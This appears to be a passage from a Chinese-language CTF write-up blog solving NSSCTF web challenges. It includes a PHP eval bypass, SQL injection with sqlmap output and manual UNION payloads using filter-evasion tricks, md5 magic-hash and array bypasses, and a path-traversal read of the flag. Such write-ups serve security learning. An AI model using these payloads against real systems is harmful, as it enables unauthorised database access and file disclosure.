class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°eval($wllm);  æ˜¯æˆ‘å€‘çš„æ”»æ“Šé» , ç›®æ¨™æ˜¯eval(system(â€œlsâ€)) ; </p><p>æ³¨æ„code ä¸­æœ‰blacklist &#x3D; [â€˜ â€˜,â€™\tâ€™,â€™\râ€™,â€™\nâ€™,â€™+â€˜,â€™[â€˜,â€™^â€˜,â€™]â€˜,â€™&quot;â€˜,â€™-â€˜,â€™$â€˜,â€™*â€˜,â€™?â€˜,â€™&lt;â€˜,â€™&gt;â€˜,â€™=â€˜,â€™`â€˜,];</p><p>é‚„ä¸èƒ½ç”¨è‹±æ–‡ preg_match(â€˜&#x2F;[a-zA-Z]&#x2F;isâ€™,$wllm)</p><p>é‚£æˆ‘å€‘å…ˆæ‰“é–‹fuzzshell ç”Ÿæˆçˆ†ç ´å­—å…¸</p><img src="68fc75ee60f78a41d0431d475fd0455f.png" alt="68fc75ee60f78a41d0431d475fd0455f.png" /><p>æ‰“é–‹BPå»çˆ†ç ´</p><img src="d1ce41419b7f2b6ec5cdbdcf65ede830.png" alt="d1ce41419b7f2b6ec5cdbdcf65ede830.png" /><p>ls åªæœ‰index.php  </p><img src="5694fffa82991a04e902a2ea2bb8de50.png" alt="5694fffa82991a04e902a2ea2bb8de50.png" /><p>å†çœ‹çœ‹æ ¹ç›®éŒ„ </p><img src="d231317ca11fe1a936d1cd673796df37.png" alt="d231317ca11fe1a936d1cd673796df37.png" /><p>æœ‰ä¸€å€‹flllllaaaaaagggggggæ–‡ä»¶ , å‰›å‰›è©¦äº†è©¦cd flllllaaaaaagggggggæ²’æˆåŠŸ , æ‡‰è©²æ˜¯txtæ–‡ä»¶ , æ‰“é–‹fuzzshell system(â€œcd &#x2F;flllllaaaaaagggggggâ€) å»é‡ </p><img src="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" alt="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" /><p>BPçˆ†ç ´ä¸€ä¸‹ , </p><img src="1ead456a2dd32d44ed0184888a306ec8.png" alt="1ead456a2dd32d44ed0184888a306ec8.png" /><h2 id="16-sql"><a href="#16-sql" class="headerlink" title="16.sql"></a>16.sql</h2><p><a href="http://node4.anna.nssctf.cn:28194/?wllm=1">http://node4.anna.nssctf.cn:28194/?wllm=1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 4783=4783 AND &#x27;DgVI&#x27;=&#x27;DgVI</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 3858 FROM(SELECT COUNT(*),CONCAT(0x716b716b71,(SELECT (ELT(3858=3858,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;jyRE&#x27;=&#x27;jyRE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2372 FROM (SELECT(SLEEP(5)))FzLh) AND &#x27;HGWW&#x27;=&#x27;HGWW</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-4416&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x716b716b71,0x4d46505569644a6c594c556f656e6c726f706b4d484b6c79586c7574617a6e6b6559774368484f61,0x7170766271)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾å­—æ®µæ•°æ—¶ï¼Œæç¤ºè¯·å‹¿éæ³•æ“ä½œ</p><img src="94fafbe1a6e373bab66ac9d3f430d7fb.png" alt="94fafbe1a6e373bab66ac9d3f430d7fb.png" /><p>è¯´æ˜ç©ºæ ¼å‡ºç°è¿‡æ»¤ï¼Œå¯ä»¥ç”¨&#x2F;**&#x2F;ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1%27/**/order/**/by/**/4%23</span><br><span class="line"></span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>æ²’æœ‰4å­—æ®µæ•°ä¸º3</p> <img src="a4b2b77c2d1027399b7b6be442d414ad.png" alt="a4b2b77c2d1027399b7b6be442d414ad.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><img src="a829ef4366104e99100478c564649d4f.png" alt="a829ef4366104e99100478c564649d4f.png" /><p>çœ‹ä¾†é‚„æœ‰è¿‡æ»¤ &#x3D; </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨likeä»£æ›¿&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</span><br></pre></td></tr></table></figure><img src="0541955768dbadf0f5138e3a13144d49.png" alt="0541955768dbadf0f5138e3a13144d49.png" /><p>æŸ¥çœ‹LTLT_flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like(%22LTLT_flag%22)%23</span><br></pre></td></tr></table></figure><img src="83ca98ed1f3c834abef68f4562d61d30.png" alt="83ca98ed1f3c834abef68f4562d61d30.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="2370baa6b1f4efac7147c371cfe695f1.png" alt="2370baa6b1f4efac7147c371cfe695f1.png" /><p>flag1 : NSSCTF{cf9ffc45-7a1</p><p>strlen(string)æœ‰20å€‹å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><p>åœ¨group_concat åŠ ä¸€å€‹mid(group_concat(column_name), èµ·å§‹ä½ç½®, é•¿åº¦) </p><p>mid(â€¦â€¦..,21,40)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1%27union/**/select/**/1,mid(group_concat(id,flag),21,40),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="40f96c8eb3a9f9156c397332ae075bcc.png" alt="40f96c8eb3a9f9156c397332ae075bcc.png" /><p>flag2 : 7-4e7a-b6d8-10ff2ead</p><p>41 - 60</p><img src="86120c33fa0c7fbcc9dfe0342d825306.png" alt="86120c33fa0c7fbcc9dfe0342d825306.png" /><p>db58}</p><p>flag : NSSCTF{cf9ffc45-7a17-4e7a-b6d8-10ff2eaddb58}</p><br/><h2 id="17-babyphp"><a href="#17-babyphp" class="headerlink" title="17.babyphp"></a>17.babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>post ä¸€å€‹ aä¸å¯ä»¥æ˜¯æ•¸å­— , ä½†æ˜¯ä¸€å€‹æ•¸å­—</li><li>post å…©å€‹ b1 b2 md5å€¼ä¸€æ¨£</li><li>post å…©å€‹ c1 c2å…©å­—ç¬¦ä¸²ä¸ç›¸ç­‰, md5å€¼ä¸€æ¨£</li></ol><p>aå¯ä»¥ç”¨æ•¸çµ„ç¹é a[]&#x3D;1</p><p>b1 b2 éƒ½å¯ä»¥ç”¨æ•¸çµ„ç¹é æ–¹æ³•äºŒï¼šä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼ˆæ›´ç®€å•ï¼‰</p><br/><p>å¦‚æœPHPç‰ˆæœ¬å…è®¸ï¼Œå¯ä»¥å°è¯•ï¼š</p><p>b1[]&#x3D;1&amp;b2[]&#x3D;2  &#x2F;&#x2F; NULL &#x3D;&#x3D;&#x3D; NULL</p><p>c1 , c2: md5ç›¸åŒå€¼æ–‡ä»¶é¸ä¸€å€‹ (0eç¹é) &#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="55bf9b54aede8a60262900db6606f8d2.png" alt="55bf9b54aede8a60262900db6606f8d2.png" /><h2 id="18-å¥‡å¦™çš„MD5"><a href="#18-å¥‡å¦™çš„MD5" class="headerlink" title="18.å¥‡å¦™çš„MD5"></a>18.å¥‡å¦™çš„MD5</h2><h3 id="å…©ç¥å¥‡çš„å­—ç¬¦ä¸²"><a href="#å…©ç¥å¥‡çš„å­—ç¬¦ä¸²" class="headerlink" title="å…©ç¥å¥‡çš„å­—ç¬¦ä¸²"></a>å…©ç¥å¥‡çš„å­—ç¬¦ä¸²</h3><p><strong>0e215962017</strong> md5åŠ å¯†å¾Œ : <strong>0e291242476940776845150308577824</strong></p><p><strong>ffifdyop</strong> md5åŠ å¯†å¾Œ:** 276f722736c95d99e921722cf9ed621c** , from hex å¾Œæ˜¯** â€˜orâ€™6Ã‰]Â™Ã©!r,Ã¹Ã­b**</p><p>ffifdyopæ˜¯è¬èƒ½å¯†ç¢¼</p><p>æŠ“å€‹åŒ…çœ‹çœ‹</p><img src="b37282e967f6ce91bd65b7ffe174a690.png" alt="b37282e967f6ce91bd65b7ffe174a690.png" /><br/><p>hint: select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</p><p>è¦å¡«å¯«è¬èƒ½å¯†ç¢¼: ffifdyop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$x= $GET[&#x27;x&#x27;];</span><br><span class="line">$y = $_GET[&#x27;y&#x27;];</span><br><span class="line">if($x != $y &amp;&amp; md5($x) == md5($y))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>(0eç¹é)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="2700d2660e4a04d9c498fa1773717036.png" alt="2700d2660e4a04d9c498fa1773717036.png" /><p>æ•°ç»„ç»•è¿‡</p><img src="128ea3f616632eba411990eb56b74c70.png" alt="128ea3f616632eba411990eb56b74c70.png" /><h2 id="19-é«˜äº®ä¸»é¢˜-åˆ’æ‰-èƒŒæ™¯æŸ¥çœ‹å™¨"><a href="#19-é«˜äº®ä¸»é¢˜-åˆ’æ‰-èƒŒæ™¯æŸ¥çœ‹å™¨" class="headerlink" title="19.é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨"></a>19.é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–‡ä»¶åŒ…å«æ¼æ´æ¼”ç¤º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–å¹¶åŒ…å«ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No file specified.&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dirsearchä¸€ä¸‹</p><img src="51ce037052d7772b9b20fbe8a7cd6b26.png" alt="51ce037052d7772b9b20fbe8a7cd6b26.png" /><p>[02:08:34] 200 -    11B - &#x2F;flag , è©¦ä¸€è©¦æœ‰äº†ä¸€å€‹æç¤º</p><img src="8a6dc14880c549d4f517c4932b726e3e.png" alt="8a6dc14880c549d4f517c4932b726e3e.png" /><p>flagåœ¨æ ¹ç›®éŒ„ä¸‹ </p><p> åœ¨urlä¸‹ä¸èƒ½&#x2F;..&#x2F;..&#x2F;..&#x2F;.. , ä»£ç¢¼æœ‰èªªæ˜  ,  é‚£BPæŠ“ä¸€ä¸‹åŒ…</p><img src="02dfb9ca469befd3b4bcca77bfe9ece6.png" alt="02dfb9ca469befd3b4bcca77bfe9ece6.png" /><p>åœ¨åˆ‡æ›ä¸»é¡Œæ™‚ç™¼ç¾æœ‰POST å‚³åƒ theme &#x3D; </p><p>è©¦ä¸€è©¦&#x2F;flag</p><img src="47b31af9751041bbc61d65e8df30f718.png" alt="47b31af9751041bbc61d65e8df30f718.png" /><p>ä¸åœ¨é€™ç›®éŒ„ä¸‹, ..ä¸€ä¸‹</p><img src="4be84a4293e0bed53f122823feda714f.png" alt="4be84a4293e0bed53f122823feda714f.png" /><p>å†..&#x2F;..&#x2F;â€¦â€¦â€¦â€¦â€¦â€¦.</p><img src="cee00419105f25959368de46b1b75db6.png" alt="cee00419105f25959368de46b1b75db6.png" /><p>theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag æˆåŠŸæ‹¿åˆ°flag</p><h2 id="20-flask-jwt"><a href="#20-flask-jwt" class="headerlink" title="20.flask?jwt?"></a>20.flask?jwt?</h2><img src="f373c598d4c19eb78f3a03e17c9f1723.png" alt="f373c598d4c19eb78f3a03e17c9f1723.png" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>å¿˜è®°å¯†ç <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/password.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/jquery-1.11.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> height=$(<span class="variable language_">document</span>).<span class="title function_">height</span>();</span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&#x27;.main&#x27;</span>).<span class="title function_">css</span>(<span class="string">&#x27;height&#x27;</span>,height);</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 919px;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main0&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formBox&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ç™»å½•å¯†ç é‡ç½®<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;mainCol firLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>èº«ä»½éªŒè¯<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span 